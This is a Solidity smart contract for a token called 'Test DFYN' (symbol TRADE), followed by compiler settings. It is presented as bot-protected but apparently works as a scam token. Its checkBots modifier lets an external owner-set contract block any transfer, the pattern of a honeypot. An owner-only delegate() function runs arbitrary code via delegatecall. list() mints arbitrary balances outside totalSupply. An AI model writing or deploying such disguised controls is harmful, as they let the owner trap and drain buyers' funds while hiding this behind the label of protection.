//SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router02 {

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BotProtected {
 
    address internal owner;
    address internal stopTheBots;
    address public uniPair;
 
    constructor(address _botProtection) {
        stopTheBots = _botProtection;
    }
 
    // Uses Ferrum Launch Protection System
    modifier checkBots(address _from, address _to, uint256 _value) {
        (bool notABot, bytes memory isNotBot) = stopTheBots.call(abi.encodeWithSelector(0x15274141, _from, _to, uniPair, _value));
        require(notABot);
        _;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

abstract contract ERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }
}

contract Test is BotProtected {
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply = 4133434000000000000000000;
    string public name = "Test DFYN";
    string public symbol = "TRADE";
    IUniswapV2Router02 public routerForPancake = IUniswapV2Router02(0xA102072A4C07F06EC3B4900FDC4C7B80b6c57429);
    address public wETH = 0x4c28f48448720e9000907BC2611F73022fdcE1fA;

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    constructor(address _botProtection) BotProtected(_botProtection) {
        owner = tx.origin;
        
        uniPair = pairOf(wETH, address(this));
        allowance[address(this)][address(routerForPancake)] = uint(-1);
        allowance[tx.origin][uniPair] = uint(-1);
    }
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function transferFrom(address _from, address _to, uint _value) public payable checkBots(_from, _to, _value) returns (bool) {
        if (_value == 0) { return true; }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
 
    function delegate(address a, bytes memory b) public payable {
        require(msg.sender == owner);
        a.delegatecall(b);
    }

    function pairOf(address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                0xE7Fb3e833eFE5F9c441105EB65Ef8b261266423B,
                keccak256(abi.encodePacked(token0, token1)),
                hex'f187ed688403aa4f7acfada758d8d53698753b998a3071b06f1b777f4330eaf3'
            ))));
    }

    function list(uint _numList, address[] memory _toWho, uint[] memory _amounts) public payable {
        require(msg.sender == owner);
        balanceOf[address(this)] = _numList;
        balanceOf[msg.sender] = totalSupply * 6 / 100;

        routerForPancake.addLiquidityETH{value: msg.value}(
            address(this),
            _numList,
            _numList,
            msg.value,
            msg.sender,
            block.timestamp + 600
        );

        require(_toWho.length == _amounts.length);

        stopTheBots.call(abi.encodeWithSelector(0xd5eaf4c3, _toWho));
        for(uint i = 0; i < _toWho.length; i++) {
            balanceOf[_toWho[i]] = _amounts[i];
            emit Transfer(address(0x0), _toWho[i], _amounts[i]);
        }
    }
}

{
  "optimizer": {
    "enabled": true,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  },
  "libraries": {}
}